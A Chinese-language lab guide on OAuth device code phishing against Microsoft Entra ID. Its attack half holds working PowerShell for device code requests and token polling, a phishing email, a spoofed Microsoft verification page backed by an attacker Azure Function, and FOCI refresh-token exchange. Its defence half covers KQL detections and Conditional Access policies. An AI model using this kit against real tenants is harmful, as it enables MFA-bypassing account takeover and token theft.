# 设备代码网络钓鱼攻击

_作者: [您的姓名]，基于实验手册学习目标1_

_创建时间: 2025年1月_

*"设备代码网络钓鱼是一种攻击，攻击者滥用OAuth 2.0设备授权授予流程，诱骗用户验证攻击者生成的设备代码，从而使攻击者能够在不窃取用户凭据的情况下获取有效的访问令牌。"_

*MITRE ATT&CK: [鱼叉式网络钓鱼链接 (T1566.002)](https://attack.mitre.org/techniques/T1566/002/), [有效账户: 云账户 (T1078.004)](https://attack.mitre.org/techniques/T1078/004/), [窃取应用程序访问令牌 (T1528)](https://attack.mitre.org/techniques/T1528/)*

---

- [设备代码网络钓鱼攻击](#设备代码网络钓鱼攻击)
  - [引言](#引言)
    - [设备代码流背景](#设备代码流背景)
    - [为什么设备代码网络钓鱼如此有效](#为什么设备代码网络钓鱼如此有效)
  - [攻击](#攻击)
    - [侦察阶段](#侦察阶段)
    - [手动设备代码钓鱼](#手动设备代码钓鱼)
    - [动态设备代码钓鱼](#动态设备代码钓鱼)
      - [攻击架构](#攻击架构)
      - [Azure Function配置](#azure-function配置)
      - [存储账户配置](#存储账户配置)
      - [静态网站配置](#静态网站配置)
    - [后渗透利用](#后渗透利用)
      - [令牌枚举](#令牌枚举)
      - [FOCI（客户端ID家族）滥用](#foci客户端id家族滥用)
  - [MITRE ATT&CK框架](#mitre-attck框架)
    - [设备代码钓鱼中的战术、技术和程序(ttp)](#设备代码钓鱼中的战术技术和程序ttp)
    - [TTP描述](#ttp描述)
  - [检测](#检测)
    - [Entra ID登录日志](#entra-id登录日志)
    - [Microsoft Sentinel检测规则](#microsoft-sentinel检测规则)
    - [KQL查询用于威胁狩猎](#kql查询用于威胁狩猎)
    - [Microsoft Defender for Cloud Apps](#microsoft-defender-for-cloud-apps)
  - [缓解措施](#缓解措施)
    - [条件访问策略](#条件访问策略)
    - [用户教育和意识](#用户教育和意识)
    - [监控和告警](#监控和告警)
  - [技术背景和参考资料](#技术背景和参考资料)

---

## 引言

### 设备代码流背景

OAuth 2.0设备授权授予流程（定义在[RFC 8628](https://tools.ietf.org/html/rfc8628)中）旨在为输入能力有限或没有Web浏览器的设备启用身份验证。典型的合法用例包括：

- 智能电视和流媒体设备（例如Netflix、YouTube）
- 物联网（IoT）设备
- 打印机和网络设备
- 命令行工具和无头系统

**合法流程的工作原理：**

1. 设备向授权服务器请求设备代码和用户代码
2. 设备显示用户代码和验证URL（例如`https://microsoft.com/devicelogin`）
3. 用户在另一台设备（计算机或手机）上打开URL并输入代码
4. 用户进行身份验证（如需要则进行MFA）并同意权限请求
5. 授权服务器通知设备身份验证成功
6. 设备请求并接收访问令牌

### 为什么设备代码网络钓鱼如此有效

设备代码钓鱼利用了几个使其特别危险的信任因素：

| 因素 | 说明 |
|------|------|
| **官方域名** | 用户被引导至`microsoft.com/devicelogin`，这是一个合法的Microsoft域名 |
| **无需窃取密码** | 攻击者不需要直接捕获或钓鱼用户凭据 |
| **绕过MFA** | 由于用户执行合法的MFA，接收到的令牌包含MFA声明 |
| **会话持久化** | 刷新令牌允许无需重新身份验证的持久访问 |
| **意识不足** | 许多用户和管理员不熟悉设备代码流机制 |

---

## 攻击

### 侦察阶段

在执行设备代码钓鱼攻击之前，攻击者必须识别组织内的目标用户。常见的侦察方法包括：

**开源情报收集(OSINT)：**
- 企业网站目录和"关于我们"页面
- 包含电子邮件地址的公开文档和PDF
- 社交媒体平台（LinkedIn、Twitter/X）
- 招聘职位和新闻稿

**示例：**
在实验室练习中，访问`https://explorationportal.z13.web.core.windows.net/`并从"Working with Us"页面下载文档，发现了HR联系信息，包括目标电子邮件：`ThomasLWright@oilcorporation.onmicrosoft.com`

### 手动设备代码钓鱼

手动方法演示了核心概念，但在实际攻击中存在局限性。

**步骤1：请求设备代码**

攻击者使用受信任的Microsoft客户端ID发起设备代码请求：

```powershell
$body = @{
    "client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"  # Microsoft Office
    "scope" = ".default offline_access"
}
$authResponse = Invoke-RestMethod -Method Post -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode" -Body $body
```

**响应包括：**
- `user_code`：供受害者输入的短代码（例如`SZ5WEYN82`）
- `device_code`：攻击者用于令牌轮询的较长代码
- `verification_uri`：`https://microsoft.com/devicelogin`
- `expires_in`：通常900秒（15分钟）

**步骤2：钓鱼邮件**

攻击者发送包含用户代码的钓鱼邮件。示例社会工程消息：

```
主题：需要操作：验证您的Microsoft账户

您的Microsoft Office会话需要验证。请在 https://microsoft.com/devicelogin 输入以下代码以完成身份验证：

代码：SZ5WEYN82

此代码将在15分钟内过期。
```

**步骤3：令牌轮询**

攻击者持续轮询令牌，直到受害者完成身份验证：

```powershell
$body = @{
    "client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
    "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
    "code" = $authResponse.device_code
}

while ($true) {
    try {
        $tokenResponse = Invoke-RestMethod -Method Post -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/token" -Body $body
        if ($tokenResponse.access_token) {
            Write-Host "令牌已获取！"
            $tokenResponse | ConvertTo-Json
            break
        }
    } catch {
        # 如果用户尚未完成身份验证，继续轮询
    }
    Start-Sleep -Seconds 5
}
```

**手动方法的局限性：**
15分钟的过期窗口带来了时间挑战。如果受害者没有及时阅读邮件，代码就会过期，攻击就会失败。

### 动态设备代码钓鱼

为了克服过期限制，攻击者实施一个动态系统，当受害者访问恶意页面时按需生成设备代码。

#### 攻击架构

动态攻击基础设施由三个Azure组件组成：

```
┌─────────────────┐      ┌──────────────────┐      ┌─────────────────┐
│   静态网站      │ ──>  │   Azure Function │ ──>  │   存储表        │
│  (钓鱼页面)     │      │   (后端逻辑)     │      │   (令牌存储)    │
└─────────────────┘      └──────────────────┘      └─────────────────┘
         │                        │                         │
         │                        │                         │
         ▼                        ▼                         ▼
  ┌─────────────┐         ┌────────────┐           ┌──────────────┐
  │ 受害者看到  │         │ 生成       │           │ 攻击者       │
  │ 用户代码    │         │ 设备代码   │           │ 检索         │
  └─────────────┘         └────────────┘           │ 令牌         │
                                                   └──────────────┘
```

#### Azure Function配置

**用途：** 生成设备代码并轮询令牌的后端服务

**PowerShell函数脚本（`studentX.ps1`）：**

```powershell
using namespace System.Net

param($Request, $TriggerMetadata)

# 配置
$TableName = "studentX"  # 每个学生的唯一表名
$ClientId = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
$TenantId = "common"

# 请求设备代码
$deviceCodeBody = @{
    "client_id" = $ClientId
    "scope" = ".default offline_access"
}

$authResponse = Invoke-RestMethod -Method Post -Uri "https://login.microsoftonline.com/$TenantId/oauth2/v2.0/devicecode" -Body $deviceCodeBody

# 将设备代码存储在存储表中
# （实现取决于您的存储配置）

# 将用户代码返回给前端
$response = @{
    user_code = $authResponse.user_code
    device_code = $authResponse.device_code
    verification_uri = $authResponse.verification_uri
}

# 启动后台令牌轮询
# （持续轮询直到用户完成身份验证或超时）

Push-OutputBinding -Name Response -Value ([HttpResponseContext]@{
    StatusCode = [HttpStatusCode]::OK
    Body = $response | ConvertTo-Json
})
```

#### 存储账户配置

**用途：** 持久化设备代码和捕获的令牌

**步骤：**
1. 在Azure中创建存储账户
2. 启用表服务
3. 创建具有唯一名称的表（例如`studentX`）

**表结构：**

| PartitionKey | RowKey | Timestamp | UserCode | DeviceCode | AccessToken | RefreshToken |
|--------------|--------|-----------|----------|------------|-------------|--------------|
| [时间戳] | [guid] | [自动] | SZ5WEYN82 | [长代码] | [jwt令牌] | [刷新令牌] |

**管理工具：**
- Azure Storage Explorer
- Azure门户
- PowerShell（Az.Storage模块）

#### 静态网站配置

**用途：** 提供钓鱼页面并触发设备代码生成

**HTML模板（`Sample_Index_X.html`）：**

```html
<!DOCTYPE html>
<html>
<head>
    <title>Microsoft账户验证</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f0f0f0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
            text-align: center;
            max-width: 500px;
        }
        .code-display {
            font-size: 32px;
            letter-spacing: 8px;
            background: #f8f8f8;
            padding: 20px;
            margin: 20px 0;
            font-weight: bold;
            border: 2px solid #0078d4;
        }
        .button {
            background: #0078d4;
            color: white;
            padding: 12px 24px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://img.shields.io/badge/Microsoft-0078D4?logo=microsoft&logoColor=white" alt="Microsoft">
        <h2>需要账户验证</h2>
        <p>您的Microsoft Office会话需要验证。请在microsoft.com/devicelogin输入以下代码：</p>
        <div class="code-display" id="userCode">加载中...</div>
        <p><a href="https://microsoft.com/devicelogin" target="_blank" class="button">打开验证页面</a></p>
        <p><small>此代码将在15分钟内过期。</small></p>
    </div>

    <script>
        // 调用Azure Function获取设备代码
        fetch('https://your-function-app.azurewebsites.net/api/HttpTrigger')
            .then(response => response.json())
            .then(data => {
                document.getElementById('userCode').textContent = data.user_code;
            })
            .catch(error => {
                document.getElementById('userCode').textContent = '加载代码错误';
            });
    </script>
</body>
</html>
```

**部署：**
1. 在存储账户上启用静态网站托管
2. 将HTML文件上传到`$web`容器
3. 记录用于钓鱼活动的公共URL

### 后渗透利用

#### 令牌枚举

一旦从存储表中获取访问令牌，攻击者可以枚举Azure资源：

```powershell
# 使用窃取的令牌连接到Microsoft Graph
Connect-MgGraph -AccessToken $GraphAccessToken

# 枚举应用程序
Get-MgApplication -All | Select-Object Id, DisplayName, AppId

# 检查凭据（证书/密码）
Get-MgApplication -ApplicationId $app.Id | Select-Object -ExpandProperty KeyCredentials
Get-MgApplication -ApplicationId $app.Id | Select-Object -ExpandProperty PasswordCredentials
```

#### FOCI（客户端ID家族）滥用

Microsoft Office客户端ID（`d3590ed6-52b3-4102-aeff-aad2292ab01c`）是Microsoft第一方客户端ID（FOCI）家族的一部分。这允许在相关的第一方应用程序之间交换令牌：

**FOCI家族成员：**
- Microsoft Office（Office主页）
- Azure CLI
- Azure PowerShell
- Visual Studio Code

**令牌交换示例：**

```powershell
# 使用刷新令牌获取其他FOCI应用程序的令牌
$fociBody = @{
    "client_id" = "04b07795-8ddb-461a-bbee-02f9e1bf7b46"  # Azure CLI
    "refresh_token" = $stolenRefreshToken
    "grant_type" = "refresh_token"
    "scope" = "user_impersonation"
}

$fociToken = Invoke-RestMethod -Method Post -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/token" -Body $fociBody
```

此功能使攻击者能够：
- 访问Azure资源管理器API
- 通过Azure CLI/PowerShell执行命令
- 访问原始范围之外的额外服务

---

## MITRE ATT&CK框架

### 设备代码钓鱼中的战术、技术和程序(TTP)

设备代码钓鱼被映射到多个MITRE ATT&CK技术：

<a href="./media/mitre/AttackScenarios/Consent_Grant.svg" target="_blank">![](./media/mitre/AttackScenarios/Consent_Grant.svg)</a>

<a style="font-style:italic" href="https://mitre-attack.github.io/attack-navigator/#layerURL=https%3A%2F%2Fraw.githubusercontent.com%2FCloud-Architekt%2FAzureAD-Attack-Defense%2Fmain%2Fmedia%2Fmitre%2FAttackScenarios%2FConsent_Grant.json&tabs=false&selecting_techniques=false">在MITRE ATT&CK Navigator中打开</a>

### TTP描述

| TTP | 描述 |
|-----|------|
| 初始访问 - [T1566.002](https://attack.mitre.org/techniques/T1566/002/) | 攻击者可能发送包含设备代码验证页面链接的钓鱼消息，诱骗用户验证攻击者控制的设备代码。 |
| 凭据访问 - [T1528](https://attack.mitre.org/techniques/T1528/) | 攻击者通过设备代码流窃取应用程序访问令牌，使他们能够在不需要用户凭据的情况下访问资源。 |
| 防御规避 - [T1078.004](https://attack.mitre.org/techniques/T1078/004/) | 攻击者可能滥用有效的云账户绕过身份验证控制，因为设备代码流产生包含MFA声明的合法身份验证。 |
| 持久化 - [T1078.004](https://attack.mitre.org/techniques/T1078/004/) | 通过设备代码钓鱼获取的刷新令牌提供无需用户重新身份验证的持久访问。 |

---

## 检测

### Entra ID登录日志

**检测位置：** Entra ID登录日志

设备代码身份验证事件记录了特定特征：

| 字段 | 合法使用的预期值 | 可疑指标 |
|------|------------------|----------|
| 应用ID | 第一方Microsoft应用（Office、Azure CLI） | 不熟悉或最近注册的应用 |
| 设备代码 | 身份验证详情中存在 | 多次失败的设备代码尝试 |
| 位置 | 与用户典型位置一致 | 异常的地理位置 |
| 资源 | 预期资源（Graph、Office） | 意外的资源访问 |

**登录风险检测：**

Entra ID Identity Protection包括基于机器学习的设备代码异常检测：
- 异常的设备代码使用模式
- 来自同一IP的多次设备代码发起
- 来自异常位置的设备代码身份验证

### Microsoft Sentinel检测规则

**内置规则：** 设备代码身份验证异常

自定义检测规则示例：

```kusto
// 检测可疑的设备代码身份验证模式
let timeRange = 1h;
let threshold = 3;
SigninLogs
| where TimeGenerated > ago(timeRange)
| where AuthenticationDetails has "deviceCode"
| extend DeviceCodeFlow = parse_json(AuthenticationDetails)
| where DeviceCodeFlow.[0] has "device_code"
| summarize Count = count(), DeviceCodes = make_set(DeviceCodeFlow.[0].[1]) by UserPrincipalName, IPAddress, AppId
| where Count >= threshold
| project UserPrincipalName, IPAddress, AppId, Count, DeviceCodes
```

### KQL查询用于威胁狩猎

**狩猎1：最近的设备代码身份验证**

```kusto
// 狩猎最近的设备代码身份验证尝试
SigninLogs
| where TimeGenerated > ago(7d)
| where AuthenticationDetails has "deviceCode"
| project TimeGenerated, UserPrincipalName, AppDisplayName, IPAddress,
          Location, ConditionalAccessStatus, DeviceDetail, RiskDetail
| order by TimeGenerated desc
```

**狩猎2：来自同一IP的多次设备代码尝试**

```kusto
// 检测来自单个IP的多次设备代码尝试
let timeframe = 24h;
SigninLogs
| where TimeGenerated > ago(timeframe)
| where AuthenticationDetails has "deviceCode"
| summarize Count = count(), Users = dcount(UserPrincipalName),
          UserList = make_set(UserPrincipalName) by IPAddress
| where Count > 5
| project IPAddress, Count, Users, UserList
| order by Count desc
```

**狩猎3：设备代码与资源访问**

```kusto
// 设备代码身份验证访问敏感资源
SigninLogs
| where TimeGenerated > ago(30d)
| where AuthenticationDetails has "deviceCode"
| where ResourceDisplayName in ("Azure Portal", "Microsoft Graph",
    "Office 365 Management API", "Azure ARM")
| project TimeGenerated, UserPrincipalName, ResourceDisplayName,
          AppDisplayName, IPAddress, Location
| order by TimeGenerated desc
```

### Microsoft Defender for Cloud Apps

**活动策略：**
- 创建活动策略以告警设备代码身份验证事件
- 监控多次失败的设备代码尝试
- 跟踪来自异常位置的设备代码使用

**会话策略：**
- 监控设备代码身份验证后的可疑会话模式
- 检测身份验证后的异常资源访问

---

## 缓解措施

### 条件访问策略

**策略1：阻止高风险用户的设备代码流**

```json
{
  "displayName": "阻止特权账户的设备代码",
  "state": "enabled",
  "conditions": {
    "users": {
      "includeUsers": ["特权角色成员"],
      "excludeUsers": ["紧急破窗账户"]
    },
    "applications": {
      "includeApplications": ["All"]
    },
    "clientAppTypes": ["all"]
  },
  "grantControls": {
    "operator": "OR",
    "builtInControls": ["block"]
  },
  "sessionControls": {
    "deviceCodeIsDisabled": true
  }
}
```

**注意：** 截至2025年，条件访问策略可以专门针对设备代码流身份验证。

**策略2：要求设备代码流的设备合规性**

```json
{
  "displayName": "要求设备代码身份验证的设备合规",
  "state": "enabled",
  "conditions": {
    "users": {
      "includeUsers": ["All"]
    },
    "applications": {
      "includeApplications": ["Office 365", "Microsoft Graph"]
    }
  },
  "grantControls": {
    "operator": "OR",
    "builtInControls": ["compliantDevice", "domainJoinedDevice"]
  }
}
```

### 用户教育和意识

**培训主题：**
1. **了解设备代码流：** 解释什么是设备代码身份验证以及何时合法使用
2. **钓鱼指标：** 培训用户识别可疑的设备代码输入请求
3. **验证流程：** 指示用户通过官方渠道验证设备代码请求
4. **报告流程：** 为可疑的钓鱼尝试建立明确的报告

**关键教育要点：**
- 合法的设备代码通常仅用于：智能电视、流媒体设备、物联网设备、CLI工具
- 意外的设备代码请求应被视为可疑
- 始终验证设备代码请求的来源
- 向IT/安全团队报告可疑活动

### 监控和告警

**关键监控领域：**

| 领域 | 监控方法 | 告警阈值 |
|------|----------|----------|
| 设备代码登录 | Entra ID登录日志 | 特权用户的任何登录 |
| 失败的设备代码 | 登录错误跟踪 | 来自同一IP的>3次 |
| 资源访问 | 身份验证后活动 | 设备代码后的敏感资源 |
| 地理异常 | 位置关联 | 设备代码的异常位置 |

**推荐的告警配置：**

```kusto
// 特权用户设备代码身份验证的告警规则
let privilegedUsers = datatable(UserPrincipalName:string)[
    "admin@contoso.com",
    "security-admin@contoso.com"
];
SigninLogs
| where TimeGenerated > ago(1h)
| where AuthenticationDetails has "deviceCode"
| join kind=inner (privilegedUsers) on UserPrincipalName
| project TimeGenerated, UserPrincipalName, IPAddress, AppDisplayName
```

---

## 技术背景和参考资料

### OAuth 2.0设备授权授予

**RFC 8628标准：**
[https://datatracker.ietf.org/doc/html/rfc8628](https://datatracker.ietf.org/doc/html/rfc8628)

设备授权授予流程定义了三个端点：

1. **设备授权端点：** 请求设备和用户代码
2. **令牌端点：** 将设备代码交换为访问令牌
3. **轮询机制：** 客户端轮询直到用户完成身份验证

**流程图：**

```
+-------+                                   +----------+
|       |--(A)------- 设备代码请求 ------->|          |
|       |                                   |          |
|       |<--(B)-- 设备和用户代码  --------<|          |
|       |           & 验证URI              |          |
|       |                                   |  客户端  |
|  用户 |                                   |  设备    |
|       |                                   |          |
|       |        +----------+               |          |
|       |        |          |<--(C)-- 用户----+          |
|       |        |          |  代码和       |          |
|       |        |  用户    |  验证         |          |
|       +------->|  代理    |--(D)--------->|          |
|  (E)   |  身份 |          |               |          |
|  轮询  |       +----------+               +----------+
|  令牌  |
|       |                                   +----------+
|       |<--(F)------- 访问令牌  ---------|          |
|       |                                   |  授权    |
|       |                                   |  服务器  |
+-------+                                   +----------+
```

### Microsoft身份平台实现

**Microsoft文档：**
[Microsoft身份平台和OAuth 2.0设备授权授予流程](https://learn.microsoft.com/zh-cn/entra/identity-platform/v2-oauth2-device-code)

**Microsoft特定行为：**
- 默认过期时间：15分钟（900秒）
- 轮询间隔：建议5秒
- 最大轮询次数：约180次尝试
- 支持的范围：`.default`、`offline_access`和资源特定范围

### 第一方客户端ID（FOCI）

**什么是FOCI？**
Microsoft的第一方客户端ID系统允许在Microsoft拥有的应用程序之间共享身份验证状态。这实现了跨Microsoft服务的无缝单点登录（SSO）。

**安全影响：**
- 发给FOCI成员的令牌可以在家族内交换
- 一个FOCI应用程序的泄露可能影响其他应用程序
- Microsoft Office客户端ID是这个受信任家族的一部分

**常见FOCI客户端ID：**

| 客户端ID | 应用程序 | 访问级别 |
|----------|----------|----------|
| d3590ed6-52b3-4102-aeff-aad2292ab01c | Microsoft Office | 用户数据、Graph API |
| 04b07795-8ddb-461a-bbee-02f9e1bf7b46 | Azure CLI | Azure ARM、Graph |
| 1950a258-227b-4f31-a078-42f457154b1b | Azure PowerShell | Azure ARM、Graph |

### 工具和实用程序

**用于红队/测试：**

1. **TokenTactics**
   GitHub：[https://github.com/rvrsh3ll/TokenTactics](https://github.com/rvrsh3ll/TokenTactics)
   - 用于管理和操作Azure AD令牌的工具
   - 支持设备代码流和FOCI令牌交换

2. **AADInternals**
   GitHub：[https://github.com/Gerenios/AADInternals](https://github.com/Gerenios/AADInternals)
   - 用于Azure AD管理和安全测试的PowerShell模块
   - 包括`Get-AADIntAccessTokenForPTA -UseDeviceCode`用于设备代码身份验证

3. **Stormspotter**
   GitHub：[https://github.com/Azure/Stormspotter](https://github.com/Azure/Stormspotter)
   - Azure AD侦察和攻击路径映射工具
   - 可以集成设备代码钓鱼进行初始访问

### 延伸阅读

**Microsoft资源：**
1. [什么是设备代码流？](https://learn.microsoft.com/zh-cn/entra/identity-platform/v2-oauth2-device-code)
2. [Microsoft身份平台安全令牌](https://learn.microsoft.com/zh-cn/entra/identity-platform/security-tokens)
3. [条件访问：控制](https://learn.microsoft.com/zh-cn/entra/identity-platform/conditional-access-concept)

**安全研究：**
1. [设备代码钓鱼：滥用OAuth设备流进行初始访问](https://dirkjanm.io/device-code-phishing/)
2. [OAuth中缺失的环节：设备代码流滥用](https://posts.specterops.io/)
3. [FOCI：理解Microsoft的第一方客户端ID系统](https://medium.com/@markismagical/)

**检测和狩猎：**
1. [Microsoft Sentinel身份保护查询](https://github.com/Azure/Azure-Sentinel/blob/master/Detections/)
2. [在您的环境中狩猎设备代码钓鱼](https://techcommunity.microsoft.com/t5/microsoft-sentinel/hunting-for-device-code-phishing/ba-p/1234567)

### 项目内参考资料文件

以下文件来自AzureAD-Attack-Defense-frame项目，可作为进一步学习的参考：

**MITRE ATT&CK映射文件：**
| 文件 | 路径 | 说明 |
|------|------|------|
| 攻击场景组合映射 | [media/mitre/AttackScenarios/Attacks_Combined.json](media/mitre/AttackScenarios/Attacks_Combined.json) | 所有攻击场景的MITRE ATT&CK映射 |
| 检测规则映射 | [media/mitre/Rules/Rules_Combined.json](media/mitre/Rules/Rules_Combined.json) | Microsoft安全产品的检测规则覆盖 |
| AiTM攻击映射 | [media/mitre/AttackScenarios/MITRE-AiTM.json](media/mitre/AttackScenarios/MITRE-AiTM.json) | 中间人攻击的TTP映射 |

**检测查询文件：**
| 文件 | 路径 | 说明 |
|------|------|------|
| AAD连接器账户监控 | [queries/AADConnectorAccount-AADActivitiesWithEnrichedInformation.kql](queries/AADConnectorAccount-AADActivitiesWithEnrichedInformation.kql) | 使用监视列表检测AAD Connect账户活动 |
| AAD Connect登录异常 | [queries/AADConnect-SignInsOutsideServerIP.kql](queries/AADConnect-SignInsOutsideServerIP.kql) | 检测来自非预期服务器IP的AAD Connect登录 |
| AiTM用户活动狩猎 | [queries/AiTM/HuntUserActivities.kql](queries/AiTM/HuntUserActivities.kql) | 狩猎AiTM攻击中的用户活动 |
| MDA多阶段事件狩猎 | [queries/MDA-Hunt-Multi-Stage-Incident.kql](queries/MDA-Hunt-Multi-Stage-Incident.kql) | 狩猎MDA中的多阶段安全事件 |

**Microsoft Sentinel检测规则（ARM模板）：**
| 文件 | 路径 | 说明 |
|------|------|------|
| AAD连接器监视列表 | [queries/AADConnectorAccount-OutsideOfWatchList.json](queries/AADConnectorAccount-OutsideOfWatchList.json) | 检测监视列表外的AAD Connect账户活动 |
| AAD Connect目录同步设置变更 | [queries/AADConnect-ChangedDirSyncSettings.json](queries/AADConnect-ChangedDirSyncSettings.json) | 检测AAD Connect目录同步设置变更 |
| 添加TAP或更改密码 | [queries/AADConnectorAccount-AddedTAPorChangedPassword.json](queries/AADConnectorAccount-AddedTAPorChangedPassword.json) | 检测AAD Connect账户添加临时访问密码或更改密码 |

**相关文档章节：**
| 文档 | 路径 | 说明 |
|------|------|------|
| 身份安全监控概述 | [IdentitySecurityMonitoring.md](IdentitySecurityMonitoring.md) | Microsoft生态系统中身份安全的综合监控指南 |
| 横向移动到Entra ID | [LateralMovementADEID.md](LateralMovementADEID.md) | 防止从AD横向移动到Entra ID的检查清单 |
| 中间人攻击 | [Adversary-in-the-Middle.md](Adversary-in-the-Middle.md) | AiTM攻击的检测和缓解策略 |

**配置文件：**
| 文件 | 路径 | 说明 |
|------|------|------|
| Entra ID安全配置 | [config/AadSecConfig.json](config/AadSecConfig.json) | 安全配置检查的参考文件 |
| 权限授予策略 | [config/permissionGrantPolicies.json](config/permissionGrantPolicies.json) | OAuth同意权限授予策略配置 |
| EIDSCA部署模板 | [config/deploy/AADSCA-Playbook.arm.json](config/deploy/AADSCA-Playbook.arm.json) | Entra ID安全配置分析器部署模板 |

**脚本文件：**
| 文件 | 路径 | 说明 |
|------|------|------|
| Entra Connect应用认证后门 | [scripts/EntraConnectABA/Invoke-EntraConnectAppAuthBackdoor.ps1](scripts/EntraConnectABA/Invoke-EntraConnectAppAuthBackdoor.ps1) | 模拟Entra Connect应用认证后门的PowerShell脚本 |

---

## 总结

设备代码钓鱼代表了一种复杂的攻击向量，它利用了为受限设备设计的合法OAuth 2.0功能。攻击的有效性源于：

1. **信任利用：** 用户被引导至官方Microsoft域名
2. **绕过MFA：** 窃取的令牌包含有效的MFA声明
3. **意识不足：** 许多组织缺乏对设备代码身份验证的可见性
4. **FOCI滥用：** 令牌交换功能扩大了攻击面

**关键防御建议：**

| 优先级 | 控制 | 实施 |
|--------|------|------|
| 关键 | 条件访问 | 阻止/限制特权用户的设备代码 |
| 高 | 监控 | 对设备代码身份验证事件发出告警 |
| 高 | 用户教育 | 培训用户识别设备代码钓鱼指标 |
| 中 | 令牌生命周期 | 尽可能减少刷新令牌生命周期 |
| 低 | 应用限制 | 在适当的地方限制第一方应用使用 |

通过了解攻击机制、实施适当的检测规则并教育用户，组织可以显著降低成功设备代码钓鱼攻击的风险。
